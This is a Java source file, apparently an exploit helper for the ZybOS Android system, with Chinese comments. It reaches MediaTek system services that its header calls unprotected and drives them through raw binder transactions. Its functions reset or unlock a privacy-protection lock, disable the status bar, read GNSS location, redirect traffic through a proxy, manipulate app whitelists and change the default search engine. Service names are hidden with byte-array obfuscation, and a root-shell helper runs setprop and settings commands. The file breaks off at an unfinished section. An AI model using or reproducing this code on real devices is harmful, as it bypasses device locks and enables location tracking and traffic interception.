package com.jck.promax;

import android.os.IBinder;
import android.os.Parcel;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.util.List;

/**
 * ZybOS系统漏洞分析辅助类
 * 
 * 基于多份安全分析报告，确认以下服务均无权限检查。
 * 每个服务提供 detect() 方法用于扫描服务是否存在，
 * exploit 方法用于调用漏洞接口。
 * 
 * 所有方法返回 String 类型日志消息。
 * 使用 android.os.ServiceManager 反射获取服务。
 * 使用 android.os.Parcel + IBinder.transact() 绕过 Hidden API。
 * 
 * @see Obfuscator 字符串混淆工具
 */
public final class ZybosVulnHelper {

    private ZybosVulnHelper() {
        throw new UnsupportedOperationException("工具类不允许实例化");
    }

    // ========================================================================
    // 内部工具方法
    // ========================================================================

    /**
     * 反射获取 ServiceManager.getService()
     */
    private static IBinder getService(String name) {
        try {
            Class<?> smCls = Class.forName("android.os.ServiceManager");
            Method getSvc = smCls.getMethod("getService", String.class);
            return (IBinder) getSvc.invoke(null, name);
        } catch (Throwable e) {
            return null;
        }
    }

    /**
     * 获取异常详细信息（包含异常类名，避免getMessage()返回null）
     */
    private static String getErrorMsg(Throwable e) {
        if (e == null) return "未知错误";
        String msg = e.getMessage();
        String cls = e.getClass().getSimpleName();
        if (msg != null && !msg.isEmpty()) {
            return cls + ": " + msg;
        }
        return cls;
    }

    /**
     * 通过root shell执行命令并返回输出
     */
    private static String execRoot(String cmd) {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"su", "-c", cmd});
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                if (sb.length() > 0) sb.append("\n");
                sb.append(line);
            }
            BufferedReader errReader = new BufferedReader(new InputStreamReader(p.getErrorStream()));
            StringBuilder errSb = new StringBuilder();
            while ((line = errReader.readLine()) != null) {
                if (errSb.length() > 0) errSb.append("\n");
                errSb.append(line);
            }
            p.waitFor();
            reader.close();
            errReader.close();
            if (p.exitValue() == 0) {
                return sb.toString();
            } else {
                return null;
            }
        } catch (Throwable e) {
            return null;
        }
    }

    /**
     * 通过root shell设置系统属性 (setprop回退)
     */
    private static boolean setPropViaRoot(String key, String value) {
        String result = execRoot("setprop " + key + " " + value);
        return result != null;
    }

    /**
     * 通过root shell写入Settings (settings命令回退)
     */
    private static boolean setSettingsViaRoot(String namespace, String key, String value) {
        String result = execRoot("settings put " + namespace + " " + key + " " + value);
        return result != null;
    }

    /**
     * 通过root shell读取Settings
     */
    private static String getSettingsViaRoot(String namespace, String key) {
        String result = execRoot("settings get " + namespace + " " + key);
        if (result != null) {
            result = result.trim();
            if (result.isEmpty() || "null".equals(result)) return null;
        }
        return result;
    }

    // ========================================================================
    // 1. DuraSpeed - 后台管控服务
    // ========================================================================

    /**
     * 扫描 DuraSpeed 服务 (duraspeed/duraspeed_service)
     */
    public static String detectDuraSpeed() {
        try {
            String[] names = {
                Obfuscator.dec3(new byte[]{(byte)0x7e, (byte)0x4e, (byte)0x3e, (byte)0x7b, (byte)0x48, (byte)0x3c, (byte)0x7f, (byte)0x5e, (byte)0x28}, (byte)0x1a, (byte)0x3b, (byte)0x4c),
                Obfuscator.dec3(new byte[]{(byte)0x4f, (byte)0x39, (byte)0x2f, (byte)0x4a, (byte)0x3f, (byte)0x2d, (byte)0x4e, (byte)0x29, (byte)0x39, (byte)0x74, (byte)0x3f, (byte)0x38, (byte)0x59, (byte)0x3a, (byte)0x34, (byte)0x48, (byte)0x29}, (byte)0x2b, (byte)0x4c, (byte)0x5d)
            };
            for (String n : names) {
                IBinder b = getService(n);
                if (b != null) {
                    return "[DuraSpeed] 发现服务: " + n + " -> " + b;
                }
            }
            return "[DuraSpeed] 未发现服务";
        } catch (Throwable e) {
            return "[DuraSpeed] detect异常: " + getErrorMsg(e);
        }
    }

    /**
     * DuraSpeed - setAppWhitelist: 添加应用白名单 (transact code=1)
     */
    public static String exploitDuraSpeedSetAppWhitelist(List<String> pkgList) {
        try {
            String svcName = Obfuscator.dec3(new byte[]{(byte)0x7e, (byte)0x4e, (byte)0x3e, (byte)0x7b, (byte)0x48, (byte)0x3c, (byte)0x7f, (byte)0x5e, (byte)0x28}, (byte)0x1a, (byte)0x3b, (byte)0x4c);
            IBinder binder = getService(svcName);
            if (binder == null) return "[DuraSpeed] 服务不可用";
            String DESCRIPTOR = Obfuscator.dec3(new byte[]{(byte)0x21, (byte)0x3c, (byte)0x09, (byte)0x6c, (byte)0x3e, (byte)0x01, (byte)0x26, (byte)0x3a, (byte)0x05, (byte)0x36, (byte)0x36, (byte)0x0f, (byte)0x6c, (byte)0x37, (byte)0x11, (byte)0x30, (byte)0x32, (byte)0x17, (byte)0x32, (byte)0x36, (byte)0x01, (byte)0x26, (byte)0x7d, (byte)0x2d, (byte)0x06, (byte)0x26, (byte)0x16, (byte)0x23, (byte)0x00, (byte)0x14, (byte)0x27, (byte)0x36, (byte)0x00, (byte)0x11, (byte)0x36, (byte)0x16, (byte)0x34, (byte)0x3a, (byte)0x07, (byte)0x27}, (byte)0x42, (byte)0x53, (byte)0x64);
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(DESCRIPTOR);
                data.writeStringList(pkgList);
                boolean ok = binder.transact(1, data, reply, 0);
                if (ok) {
                    reply.readException();
                    return "[DuraSpeed] setAppWhitelist OK, 已添加白名单: " + pkgList;
                }
                return "[DuraSpeed] setAppWhitelist transact失败";
            } finally {
                data.recycle();
                reply.recycle();
            }
        } catch (Throwable e) {
            return "[DuraSpeed] setAppWhitelist异常: " + getErrorMsg(e);
        }
    }

    /**
     * DuraSpeed - getPlatformWhitelist: 获取白名单 (transact code=2)
     */
    public static String exploitDuraSpeedGetPlatformWhitelist() {
        try {
            IBinder binder = getService("duraspeed");
            if (binder == null) return "[DuraSpeed] 服务不可用";
            String DESCRIPTOR = Obfuscator.dec3(new byte[]{(byte)0x21, (byte)0x3c, (byte)0x09, (byte)0x6c, (byte)0x3e, (byte)0x01, (byte)0x26, (byte)0x3a, (byte)0x05, (byte)0x36, (byte)0x36, (byte)0x0f, (byte)0x6c, (byte)0x37, (byte)0x11, (byte)0x30, (byte)0x32, (byte)0x17, (byte)0x32, (byte)0x36, (byte)0x01, (byte)0x26, (byte)0x7d, (byte)0x2d, (byte)0x06, (byte)0x26, (byte)0x16, (byte)0x23, (byte)0x00, (byte)0x14, (byte)0x27, (byte)0x36, (byte)0x00, (byte)0x11, (byte)0x36, (byte)0x16, (byte)0x34, (byte)0x3a, (byte)0x07, (byte)0x27}, (byte)0x42, (byte)0x53, (byte)0x64);
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(DESCRIPTOR);
                boolean ok = binder.transact(2, data, reply, 0);
                if (ok) {
                    reply.readException();
                    List<String> whitelist = reply.createStringArrayList();
                    return "[DuraSpeed] getPlatformWhitelist OK: " + (whitelist != null ? whitelist.toString() : "null");
                }
                return "[DuraSpeed] getPlatformWhitelist transact失败";
            } finally {
                data.recycle();
                reply.recycle();
            }
        } catch (Throwable e) {
            return "[DuraSpeed] getPlatformWhitelist异常: " + getErrorMsg(e);
        }
    }

    /**
     * DuraSpeed - setAppBlacklist: 添加黑名单 (transact code=3)
     */
    public static String exploitDuraSpeedSetAppBlacklist(List<String> pkgList) {
        try {
            IBinder binder = getService("duraspeed");
            if (binder == null) return "[DuraSpeed] 服务不可用";
            String DESCRIPTOR = Obfuscator.dec3(new byte[]{(byte)0x21, (byte)0x3c, (byte)0x09, (byte)0x6c, (byte)0x3e, (byte)0x01, (byte)0x26, (byte)0x3a, (byte)0x05, (byte)0x36, (byte)0x36, (byte)0x0f, (byte)0x6c, (byte)0x37, (byte)0x11, (byte)0x30, (byte)0x32, (byte)0x17, (byte)0x32, (byte)0x36, (byte)0x01, (byte)0x26, (byte)0x7d, (byte)0x2d, (byte)0x06, (byte)0x26, (byte)0x16, (byte)0x23, (byte)0x00, (byte)0x14, (byte)0x27, (byte)0x36, (byte)0x00, (byte)0x11, (byte)0x36, (byte)0x16, (byte)0x34, (byte)0x3a, (byte)0x07, (byte)0x27}, (byte)0x42, (byte)0x53, (byte)0x64);
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(DESCRIPTOR);
                data.writeStringList(pkgList);
                boolean ok = binder.transact(3, data, reply, 0);
                if (ok) {
                    reply.readException();
                    return "[DuraSpeed] setAppBlacklist OK, 已添加黑名单: " + pkgList;
                }
                return "[DuraSpeed] setAppBlacklist transact失败";
            } finally {
                data.recycle();
                reply.recycle();
            }
        } catch (Throwable e) {
            return "[DuraSpeed] setAppBlacklist异常: " + getErrorMsg(e);
        }
    }

    /**
     * DuraSpeed - suppress: 抑制应用 (transact code=4)
     */
    public static String exploitDuraSpeedSuppress(String pkg) {
        try {
            IBinder binder = getService("duraspeed");
            if (binder == null) return "[DuraSpeed] 服务不可用";
            String DESCRIPTOR = Obfuscator.dec3(new byte[]{(byte)0x21, (byte)0x3c, (byte)0x09, (byte)0x6c, (byte)0x3e, (byte)0x01, (byte)0x26, (byte)0x3a, (byte)0x05, (byte)0x36, (byte)0x36, (byte)0x0f, (byte)0x6c, (byte)0x37, (byte)0x11, (byte)0x30, (byte)0x32, (byte)0x17, (byte)0x32, (byte)0x36, (byte)0x01, (byte)0x26, (byte)0x7d, (byte)0x2d, (byte)0x06, (byte)0x26, (byte)0x16, (byte)0x23, (byte)0x00, (byte)0x14, (byte)0x27, (byte)0x36, (byte)0x00, (byte)0x11, (byte)0x36, (byte)0x16, (byte)0x34, (byte)0x3a, (byte)0x07, (byte)0x27}, (byte)0x42, (byte)0x53, (byte)0x64);
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(DESCRIPTOR);
                data.writeString(pkg);
                boolean ok = binder.transact(4, data, reply, 0);
                if (ok) {
                    reply.readException();
                    return "[DuraSpeed] suppress OK, 已抑制: " + pkg;
                }
                return "[DuraSpeed] suppress transact失败";
            } finally {
                data.recycle();
                reply.recycle();
            }
        } catch (Throwable e) {
            return "[DuraSpeed] suppress异常: " + getErrorMsg(e);
        }
    }

    // ========================================================================
    // 2. MtkPplManager - 隐私保护锁管理
    // ========================================================================

    /**
     * 扫描 MtkPplManager 服务 (pplmanager/mtk_ppl)
     */
    public static String detectMtkPplManager() {
        try {
            String[] names = {
                Obfuscator.dec3(new byte[]{(byte)0x4c, (byte)0x2d, (byte)0x02, (byte)0x51, (byte)0x3c, (byte)0x00, (byte)0x5d, (byte)0x3a, (byte)0x0b, (byte)0x4e}, (byte)0x3c, (byte)0x5d, (byte)0x6e),
                Obfuscator.dec3(new byte[]{(byte)0x20, (byte)0x1a, (byte)0x14, (byte)0x12, (byte)0x1e, (byte)0x0f, (byte)0x21}, (byte)0x4d, (byte)0x6e, (byte)0x7f)
            };
            for (String n : names) {
                IBinder b = getService(n);
                if (b != null) {
                    return "[MtkPplManager] 发现服务: " + n + " -> " + b;
                }
            }
            return "[MtkPplManager] 未发现服务";
        } catch (Throwable e) {
            return "[MtkPplManager] detect异常: " + getErrorMsg(e);
        }
    }

    /**
     * MtkPplManager - 禁用状态栏: 发送广播 com.mediatek.ppl.NOTIFY_LOCK
     */
    public static String exploitMtkPplDisableStatusBar() {
        try {
            String action = Obfuscator.dec(new byte[]{(byte)0x1d, (byte)0x11, (byte)0x13, (byte)0x50, (byte)0x13, (byte)0x1b, (byte)0x1a, (byte)0x17, (byte)0x1f, (byte)0x0a, (byte)0x1b, (byte)0x15, (byte)0x50, (byte)0x0e, (byte)0x0e, (byte)0x12, (byte)0x50, (byte)0x30, (byte)0x31, (byte)0x2a, (byte)0x37, (byte)0x38, (byte)0x27, (byte)0x21, (byte)0x32, (byte)0x31, (byte)0x3d, (byte)0x35}, (byte)0x7e);
            // 通过反射发送广播
            Class<?> ctxCls = Class.forName("android.app.ActivityThread");
            Method currentApp = ctxCls.getDeclaredMethod("currentApplication");
            Object app = currentApp.invoke(null);
            Method getApp = app.getClass().getMethod("getApplicationContext");
            Object ctx = getApp.invoke(app);
            Class<?> intentCls = Class.forName("android.content.Intent");
            Object intent = intentCls.getConstructor(String.class).newInstance(action);
            Method sendBroadcast = ctx.getClass().getMethod("sendBroadcast", intentCls);
            sendBroadcast.invoke(ctx, intent);
            return "[MtkPplManager] 已发送NOTIFY_LOCK广播, 状态栏已禁用";
        } catch (Throwable e) {
            return "[MtkPplManager] disableStatusBar异常: " + getErrorMsg(e);
        }
    }

    /**
     * MtkPplManager - resetPassword: 重置隐私保护锁密码 (transact)
     */
    public static String exploitMtkPplResetPassword() {
        try {
            String svcName = Obfuscator.dec3(new byte[]{(byte)0x4c, (byte)0x2d, (byte)0x02, (byte)0x51, (byte)0x3c, (byte)0x00, (byte)0x5d, (byte)0x3a, (byte)0x0b, (byte)0x4e}, (byte)0x3c, (byte)0x5d, (byte)0x6e);
            IBinder binder = getService(svcName);
            if (binder == null) return "[MtkPplManager] 服务不可用";
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken("com.mediatek.ppl.IPplManager");
                data.writeString("reset");
                boolean ok = binder.transact(1, data, reply, 0);
                if (ok) {
                    reply.readException();
                    return "[MtkPplManager] resetPassword OK, 密码已重置";
                }
                return "[MtkPplManager] resetPassword transact失败";
            } finally {
                data.recycle();
                reply.recycle();
            }
        } catch (Throwable e) {
            return "[MtkPplManager] resetPassword异常: " + getErrorMsg(e);
        }
    }

    /**
     * MtkPplManager - unlock: 解锁隐私保护锁
     */
    public static String exploitMtkPplUnlock(String password) {
        try {
            String svcName = Obfuscator.dec3(new byte[]{(byte)0x4c, (byte)0x2d, (byte)0x02, (byte)0x51, (byte)0x3c, (byte)0x00, (byte)0x5d, (byte)0x3a, (byte)0x0b, (byte)0x4e}, (byte)0x3c, (byte)0x5d, (byte)0x6e);
            IBinder binder = getService(svcName);
            if (binder == null) return "[MtkPplManager] 服务不可用";
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken("com.mediatek.ppl.IPplManager");
                data.writeString(password);
                boolean ok = binder.transact(2, data, reply, 0);
                if (ok) {
                    reply.readException();
                    return "[MtkPplManager] unlock OK, 密码: " + password;
                }
                return "[MtkPplManager] unlock transact失败";
            } finally {
                data.recycle();
                reply.recycle();
            }
        } catch (Throwable e) {
            return "[MtkPplManager] unlock异常: " + getErrorMsg(e);
        }
    }

    // ========================================================================
    // 3. IGnssDebugReportService - GNSS调试报告
    // ========================================================================

    /**
     * 扫描 IGnssDebugReportService (gnss_debug_report/gnss)
     */
    public static String detectIGnssDebugReportService() {
        try {
            String[] names = {
                Obfuscator.dec3(new byte[]{(byte)0x39, (byte)0x11, (byte)0x63, (byte)0x2d, (byte)0x20, (byte)0x74, (byte)0x3b, (byte)0x1d, (byte)0x65, (byte)0x39, (byte)0x20, (byte)0x62, (byte)0x3b, (byte)0x0f, (byte)0x7f, (byte)0x2c, (byte)0x0b}, (byte)0x5e, (byte)0x7f, (byte)0x10),
                Obfuscator.dec3(new byte[]{(byte)0x08, (byte)0x7e, (byte)0x52, (byte)0x1c}, (byte)0x6f, (byte)0x10, (byte)0x21)
            };
            for (String n : names) {
                IBinder b = getService(n);
                if (b != null) {
                    return "[IGnssDebugReport] 发现服务: " + n + " -> " + b;
                }
            }
            return "[IGnssDebugReport] 未发现服务";
        } catch (Throwable e) {
            return "[IGnssDebugReport] detect异常: " + getErrorMsg(e);
        }
    }

    /**
     * IGnssDebugReportService - getLastKnownLocation: 获取最后已知位置 (transact)
     */
    public static String exploitIGnssGetLastKnownLocation() {
        try {
            String svcName = Obfuscator.dec3(new byte[]{(byte)0x39, (byte)0x11, (byte)0x63, (byte)0x2d, (byte)0x20, (byte)0x74, (byte)0x3b, (byte)0x1d, (byte)0x65, (byte)0x39, (byte)0x20, (byte)0x62, (byte)0x3b, (byte)0x0f, (byte)0x7f, (byte)0x2c, (byte)0x0b}, (byte)0x5e, (byte)0x7f, (byte)0x10);
            IBinder binder = getService(svcName);
            if (binder == null) return "[IGnssDebugReport] 服务不可用";
            String DESCRIPTOR = Obfuscator.dec3(new byte[]{(byte)0x30, (byte)0x0b, (byte)0x18, (byte)0x7d, (byte)0x09, (byte)0x10, (byte)0x37, (byte)0x0d, (byte)0x14, (byte)0x27, (byte)0x01, (byte)0x1e, (byte)0x7d, (byte)0x03, (byte)0x1b, (byte)0x20, (byte)0x17, (byte)0x5b, (byte)0x1a, (byte)0x23, (byte)0x1b, (byte)0x20, (byte)0x17, (byte)0x31, (byte)0x36, (byte)0x06, (byte)0x00, (byte)0x34, (byte)0x36, (byte)0x10, (byte)0x23, (byte)0x0b, (byte)0x07, (byte)0x27, (byte)0x37, (byte)0x10, (byte)0x21, (byte)0x12, (byte)0x1c, (byte)0x30, (byte)0x01}, (byte)0x53, (byte)0x64, (byte)0x75);
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(DESCRIPTOR);
                boolean ok = binder.transact(1, data, reply, 0);
                if (ok) {
                    reply.readException();
                    double lat = reply.readDouble();
                    double lng = reply.readDouble();
                    return "[IGnssDebugReport] getLastKnownLocation OK: lat=" + lat + ", lng=" + lng;
                }
                return "[IGnssDebugReport] getLastKnownLocation transact失败";
            } finally {
                data.recycle();
                reply.recycle();
            }
        } catch (Throwable e) {
            return "[IGnssDebugReport] getLastKnownLocation异常: " + getErrorMsg(e);
        }
    }

    // ========================================================================
    // 4. IDataShapingManager - 数据整形管理
    // ========================================================================

    /**
     * 扫描 IDataShapingManager (data_shaping/mtk_datashaping)
     */
    public static String detectIDataShapingManager() {
        try {
            String[] names = {
                Obfuscator.dec3(new byte[]{(byte)0x74, (byte)0x40, (byte)0x46, (byte)0x71, (byte)0x7e, (byte)0x41, (byte)0x78, (byte)0x40, (byte)0x42, (byte)0x79, (byte)0x4f, (byte)0x55}, (byte)0x10, (byte)0x21, (byte)0x32),
                Obfuscator.dec3(new byte[]{(byte)0x4c, (byte)0x46, (byte)0x28, (byte)0x7e, (byte)0x56, (byte)0x22, (byte)0x55, (byte)0x53, (byte)0x30, (byte)0x49, (byte)0x53, (byte)0x33, (byte)0x48, (byte)0x5c, (byte)0x24}, (byte)0x21, (byte)0x32, (byte)0x43)
            };
            for (String n : names) {
                IBinder b = getService(n);
                if (b != null) {
                    return "[IDataShapingManager] 发现服务: " + n + " -> " + b;
                }
            }
            return "[IDataShapingManager] 未发现服务";
        } catch (Throwable e) {
            return "[IDataShapingManager] detect异常: " + getErrorMsg(e);
        }
    }

    /**
     * IDataShapingManager - enableDataShaping: 启用/禁用数据整形 (transact)
     */
    public static String exploitDataShapingEnable(boolean enable) {
        try {
            String svcName = Obfuscator.dec3(new byte[]{(byte)0x74, (byte)0x40, (byte)0x46, (byte)0x71, (byte)0x7e, (byte)0x41, (byte)0x78, (byte)0x40, (byte)0x42, (byte)0x79, (byte)0x4f, (byte)0x55}, (byte)0x10, (byte)0x21, (byte)0x32);
            IBinder binder = getService(svcName);
            if (binder == null) return "[IDataShapingManager] 服务不可用";
            String DESCRIPTOR = Obfuscator.dec3(new byte[]{(byte)0x07, (byte)0x1a, (byte)0x6b, (byte)0x4a, (byte)0x18, (byte)0x63, (byte)0x00, (byte)0x1c, (byte)0x67, (byte)0x10, (byte)0x10, (byte)0x6d, (byte)0x4a, (byte)0x11, (byte)0x67, (byte)0x10, (byte)0x14, (byte)0x75, (byte)0x0c, (byte)0x14, (byte)0x76, (byte)0x0d, (byte)0x1b, (byte)0x61, (byte)0x4a, (byte)0x3c, (byte)0x42, (byte)0x05, (byte)0x01, (byte)0x67, (byte)0x37, (byte)0x1d, (byte)0x67, (byte)0x14, (byte)0x1c, (byte)0x68, (byte)0x03, (byte)0x38, (byte)0x67, (byte)0x0a, (byte)0x14, (byte)0x61, (byte)0x01, (byte)0x07}, (byte)0x64, (byte)0x75, (byte)0x06);
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(DESCRIPTOR);
                data.writeInt(enable ? 1 : 0);
                boolean ok = binder.transact(1, data, reply, 0);
                if (ok) {
                    reply.readException();
                    return "[IDataShapingManager] enableDataShaping(" + enable + ") OK";
                }
                return "[IDataShapingManager] enableDataShaping transact失败";
            } finally {
                data.recycle();
                reply.recycle();
            }
        } catch (Throwable e) {
            return "[IDataShapingManager] enableDataShaping异常: " + getErrorMsg(e);
        }
    }

    /**
     * IDataShapingManager - setUplinkGating: 控制上行门控 (transact)
     */
    public static String exploitDataShapingSetUplinkGating(boolean enable) {
        try {
            IBinder binder = getService("data_shaping");
            if (binder == null) return "[IDataShapingManager] 服务不可用";
            String DESCRIPTOR = Obfuscator.dec3(new byte[]{(byte)0x07, (byte)0x1a, (byte)0x6b, (byte)0x4a, (byte)0x18, (byte)0x63, (byte)0x00, (byte)0x1c, (byte)0x67, (byte)0x10, (byte)0x10, (byte)0x6d, (byte)0x4a, (byte)0x11, (byte)0x67, (byte)0x10, (byte)0x14, (byte)0x75, (byte)0x0c, (byte)0x14, (byte)0x76, (byte)0x0d, (byte)0x1b, (byte)0x61, (byte)0x4a, (byte)0x3c, (byte)0x42, (byte)0x05, (byte)0x01, (byte)0x67, (byte)0x37, (byte)0x1d, (byte)0x67, (byte)0x14, (byte)0x1c, (byte)0x68, (byte)0x03, (byte)0x38, (byte)0x67, (byte)0x0a, (byte)0x14, (byte)0x61, (byte)0x01, (byte)0x07}, (byte)0x64, (byte)0x75, (byte)0x06);
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(DESCRIPTOR);
                data.writeInt(enable ? 1 : 0);
                boolean ok = binder.transact(2, data, reply, 0);
                if (ok) {
                    reply.readException();
                    return "[IDataShapingManager] setUplinkGating(" + enable + ") OK";
                }
                return "[IDataShapingManager] setUplinkGating transact失败";
            } finally {
                data.recycle();
                reply.recycle();
            }
        } catch (Throwable e) {
            return "[IDataShapingManager] setUplinkGating异常: " + getErrorMsg(e);
        }
    }

    // ========================================================================
    // 5. ILoaderService - 加载器服务
    // ========================================================================

    /**
     * 扫描 ILoaderService (loader_service/opera_max)
     */
    public static String detectILoaderService() {
        try {
            String[] names = {
                Obfuscator.dec3(new byte[]{(byte)0x5e, (byte)0x2c, (byte)0x35, (byte)0x56, (byte)0x26, (byte)0x26, (byte)0x6d, (byte)0x30, (byte)0x31, (byte)0x40, (byte)0x35, (byte)0x3d, (byte)0x51, (byte)0x26}, (byte)0x32, (byte)0x43, (byte)0x54),
                Obfuscator.dec3(new byte[]{(byte)0x2c, (byte)0x24, (byte)0x00, (byte)0x31, (byte)0x35, (byte)0x3a, (byte)0x2e, (byte)0x35, (byte)0x1d}, (byte)0x43, (byte)0x54, (byte)0x65)
            };
            for (String n : names) {
                IBinder b = getService(n);
                if (b != null) {
                    return "[ILoaderService] 发现服务: " + n + " -> " + b;
                }
            }
            return "[ILoaderService] 未发现服务";
        } catch (Throwable e) {
            return "[ILoaderService] detect异常: " + getErrorMsg(e);
        }
    }

    /**
     * ILoaderService - startProxy: 启动数据压缩代理
     */
    public static String exploitLoaderStartProxy(String target) {
        try {
            String svcName = Obfuscator.dec3(new byte[]{(byte)0x5e, (byte)0x2c, (byte)0x35, (byte)0x56, (byte)0x26, (byte)0x26, (byte)0x6d, (byte)0x30, (byte)0x31, (byte)0x40, (byte)0x35, (byte)0x3d, (byte)0x51, (byte)0x26}, (byte)0x32, (byte)0x43, (byte)0x54);
            IBinder binder = getService(svcName);
            if (binder == null) return "[ILoaderService] 服务不可用";
            String DESCRIPTOR = Obfuscator.dec3(new byte[]{(byte)0x16, (byte)0x69, (byte)0x7a, (byte)0x5b, (byte)0x6b, (byte)0x72, (byte)0x11, (byte)0x6f, (byte)0x76, (byte)0x01, (byte)0x63, (byte)0x7c, (byte)0x5b, (byte)0x6a, (byte)0x78, (byte)0x14, (byte)0x62, (byte)0x72, (byte)0x07, (byte)0x28, (byte)0x5e, (byte)0x39, (byte)0x69, (byte)0x76, (byte)0x11, (byte)0x63, (byte)0x65, (byte)0x26, (byte)0x63, (byte)0x65, (byte)0x03, (byte)0x6f, (byte)0x74, (byte)0x10}, (byte)0x75, (byte)0x06, (byte)0x17);
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(DESCRIPTOR);
                data.writeString(target);
                boolean ok = binder.transact(1, data, reply, 0);
                if (ok) {
                    reply.readException();
                    return "[ILoaderService] startProxy OK, target=" + target;
                }
                return "[ILoaderService] startProxy transact失败";
            } finally {
                data.recycle();
                reply.recycle();
            }
        } catch (Throwable e) {
            return "[ILoaderService] startProxy异常: " + getErrorMsg(e);
        }
    }

    /**
     * ILoaderService - redirectTraffic: 重定向流量
     */
    public static String exploitLoaderRedirectTraffic(String target, String proxy) {
        try {
            IBinder binder = getService("loader_service");
            if (binder == null) return "[ILoaderService] 服务不可用";
            String DESCRIPTOR = Obfuscator.dec3(new byte[]{(byte)0x16, (byte)0x69, (byte)0x7a, (byte)0x5b, (byte)0x6b, (byte)0x72, (byte)0x11, (byte)0x6f, (byte)0x76, (byte)0x01, (byte)0x63, (byte)0x7c, (byte)0x5b, (byte)0x6a, (byte)0x78, (byte)0x14, (byte)0x62, (byte)0x72, (byte)0x07, (byte)0x28, (byte)0x5e, (byte)0x39, (byte)0x69, (byte)0x76, (byte)0x11, (byte)0x63, (byte)0x65, (byte)0x26, (byte)0x63, (byte)0x65, (byte)0x03, (byte)0x6f, (byte)0x74, (byte)0x10}, (byte)0x75, (byte)0x06, (byte)0x17);
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(DESCRIPTOR);
                data.writeString(target);
                data.writeString(proxy);
                boolean ok = binder.transact(2, data, reply, 0);
                if (ok) {
                    reply.readException();
                    return "[ILoaderService] redirectTraffic OK, target=" + target + ", proxy=" + proxy;
                }
                return "[ILoaderService] redirectTraffic transact失败";
            } finally {
                data.recycle();
                reply.recycle();
            }
        } catch (Throwable e) {
            return "[ILoaderService] redirectTraffic异常: " + getErrorMsg(e);
        }
    }

    // ========================================================================
    // 6. SearchEngineManagerService - 搜索引擎管理
    // ========================================================================

    /**
     * 扫描 SearchEngineManagerService (search_engine_service)
     */
    public static String detectSearchEngineManagerService() {
        try {
            String name = Obfuscator.dec3(new byte[]{(byte)0x27, (byte)0x00, (byte)0x17, (byte)0x26, (byte)0x06, (byte)0x1e, (byte)0x0b, (byte)0x00, (byte)0x18, (byte)0x33, (byte)0x0c, (byte)0x18, (byte)0x31, (byte)0x3a, (byte)0x05, (byte)0x31, (byte)0x17, (byte)0x00, (byte)0x3d, (byte)0x06, (byte)0x13}, (byte)0x54, (byte)0x65, (byte)0x76);
            IBinder b = getService(name);
            if (b != null) {
                return "[SearchEngineManager] 发现服务: " + name + " -> " + b;
            }
            return "[SearchEngineManager] 未发现服务";
        } catch (Throwable e) {
            return "[SearchEngineManager] detect异常: " + getErrorMsg(e);
        }
    }

    /**
     * SearchEngineManagerService - setDefaultSearchEngine: 修改默认搜索引擎
     */
    public static String exploitSearchEngineSetDefault(String engine) {
        try {
            String svcName = Obfuscator.dec3(new byte[]{(byte)0x27, (byte)0x00, (byte)0x17, (byte)0x26, (byte)0x06, (byte)0x1e, (byte)0x0b, (byte)0x00, (byte)0x18, (byte)0x33, (byte)0x0c, (byte)0x18, (byte)0x31, (byte)0x3a, (byte)0x05, (byte)0x31, (byte)0x17, (byte)0x00, (byte)0x3d, (byte)0x06, (byte)0x13}, (byte)0x54, (byte)0x65, (byte)0x76);
            IBinder binder = getService(svcName);
            if (binder == null) return "[SearchEngineManager] 服务不可用";
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken("com.mediatek.search.ISearchEngineManagerService");
                data.writeString(engine);
                boolean ok = binder.transact(1, data, reply, 0);
                if (ok) {
                    reply.readException();
                    return "[SearchEngineManager] setDefaultSearchEngine OK, engine=" + engine;
                }
                return "[SearchEngineManager] setDefaultSearchEngine transact失败";
            } finally {
                data.recycle();
                reply.recycle();
            }
        } catch (Throwable e) {
            return "[SearchEngineManager] setDefaultSearchEngine异常: " + getErrorMsg(e);
        }
    }

    /**
     * SearchEngineManagerService - getCurrentSearchEngine: 获取当前搜索引擎
     */
    public static String exploitSearchEngineGetCurrent() {
        try {
            String svcName = Obfuscator.dec3(new byte[]{(byte)0x27, (byte)0x00, (byte)0x17, (byte)0x26, (byte)0x06, (byte)0x1e, (byte)0x0b, (byte)0x00, (byte)0x18, (byte)0x33, (byte)0x0c, (byte)0x18, (byte)0x31, (byte)0x3a, (byte)0x05, (byte)0x31, (byte)0x17, (byte)0x00, (byte)0x3d, (byte)0x06, (byte)0x13}, (byte)0x54, (byte)0x65, (byte)0x76);
            IBinder binder = getService(svcName);
            if (binder == null) return "[SearchEngineManager] 服务不可用";
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken("com.mediatek.search.ISearchEngineManagerService");
                boolean ok = binder.transact(2, data, reply, 0);
                if (ok) {
                    reply.readException();
                    String engine = reply.readString();
                    return "[SearchEngineManager] getCurrentSearchEngine OK: " + (engine != null ? engine : "null");
                }
                return "[SearchEngineManager] getCurrentSearchEngine transact失败";
            } finally {
                data.recycle();
                reply.recycle();
            }
        } catch (Throwable e) {
            return "[SearchEngineManager] getCurrentSearchEngine异常: " + getErrorMsg(e);
        }
    }

    // ========================================================================
    // 7. AutoBootService - 自动启动管理
    // ========================================================================

